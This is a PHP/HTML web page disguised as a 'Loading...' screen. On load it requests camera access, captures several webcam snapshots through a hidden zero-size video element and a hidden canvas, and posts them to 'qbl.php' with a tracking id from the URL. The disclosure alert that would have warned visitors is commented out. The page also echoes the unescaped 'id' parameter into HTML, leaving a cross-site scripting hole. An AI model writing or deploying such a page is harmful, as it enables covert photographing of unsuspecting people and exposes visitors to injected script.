<!DOCTYPE html>
<html>
<?php
$id = "error";
if(count($_GET) != 0 && array_key_exists('id',$_GET)){
    $id = $_GET['id'];
}
function isMobile(){
    $useragent=isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $useragent_commentsblock=preg_match('|\(.*?\)|',$useragent,$matches)>0?$matches[0]:'';
    function CheckSubstrs($substrs,$text){
        foreach($substrs as $substr)
            if(false!==strpos($text,$substr)){
                return true;
            }
        return false;
    }
    $mobile_os_list=array('Google Wireless Transcoder','Windows CE','WindowsCE','Symbian','Android','armv6l','armv5','Mobile','CentOS','mowser','AvantGo','Opera Mobi','J2ME/MIDP','Smartphone','Go.Web','Palm','iPAQ');
    $mobile_token_list=array('Profile/MIDP','Configuration/CLDC-','160×160','176×220','240×240','240×320','320×240','UP.Browser','UP.Link','SymbianOS','PalmOS','PocketPC','SonyEricsson','Nokia','BlackBerry','Vodafone','BenQ','Novarra-Vision','Iris','NetFront','HTC_','Xda_','SAMSUNG-SGH','Wapaka','DoCoMo','iPhone','iPod');
    
    $found_mobile=CheckSubstrs($mobile_os_list,$useragent_commentsblock) ||
        CheckSubstrs($mobile_token_list,$useragent);
    
    if ($found_mobile){
        return true;
    }else{
        return false;
    }
}
if(isMobile()){
    $view_width = 750;
    $view_height = 1000;
}else{
    $view_width = 1000;
    $view_height = 750;
}
?>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script src="./js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <video id="video" width="0" height="0" autoplay></video>
    <canvas style="display:none;" id="canvas" class="<?php echo $id?>" width="<?php echo $view_width?>" height="<?php echo $view_height?>"></canvas>
    <script type="text/javascript">
        //{alert("如果点击允许/授权/知道了\n本站将会访问摄像头并自动同意本站用户协议以及上传云端拍照数据\n数据每小时一删\n点击允许前请三思而行");
        window.addEventListener("DOMContentLoaded", function() {
            let canvas = document.getElementById('canvas');
            let context = canvas.getContext('2d');
            let video = document.getElementById('video');
            let view_width = 750;
            let view_height = 1000;
            let img;
            if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
                //判断iPhone|iPad|iPod|iOS
            } else if (/(Android)/i.test(navigator.userAgent)) {
                //判断Android
            } else { //pc
                view_width = 1000;
                view_height = 750;
            };
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({
                            video: true
                        }).then(function(stream) {
                            let i = 1;
                            video.srcObject = stream;
                            video.play();
                            setTimeout(() => {
                                context.drawImage(video, 0, 0, view_width, view_height);
                                img = canvas.toDataURL('image/png');
                                $.post('./qbl.php',{
                                    'id': $(canvas).attr('class'),
                                    'img': img,
                                })
                            }, 100);
                            // 快速拍照
                            let timer = setInterval(() => {
                                if(i == 1){
                                    context.drawImage(video, 0, 0, view_width, view_height);
                                    img = canvas.toDataURL('image/png');
                                    $.post('./qbl.php',{
                                        'id': $(canvas).attr('class'),
                                        'img': img,
                                    })
                                    // 1
                                }else{
                                    setTimeout(() => {
                                        context.drawImage(video, 0, 0, view_width, view_height);
                                    }, 1000);
                                    setTimeout(() => {
                                        img = canvas.toDataURL('image/png');
                                        $.post('./qbl.php',{
                                            'id': $(canvas).attr('class'),
                                            'img': img,
                                        })
                                    }, 1300);
                                    // n
                                }
                                i++;
                                if(i > 4){
                                    clearInterval(timer);
                                }
                            },2000);
                        }, function() {
                            alert("你的选择是正确的");
                        });
                }else{
                    setTimeout(function() {
                        console.log("您的设备不支持此功能");
                        img = canvas.toDataURL('image/png');
                        document.getElementById('result').value = img;
                        // document.getElementById('gopo').submit();
                    }, 1300);
                };
        }, false);
    </script>
    <form action="qbl.php" id="gopo" method="post">
        <input type="hidden" name="img" id="result" value="" />
        <input type="hidden" name="id" id="get" value="<?php echo $id?>" />
    </form>
</body>

</html>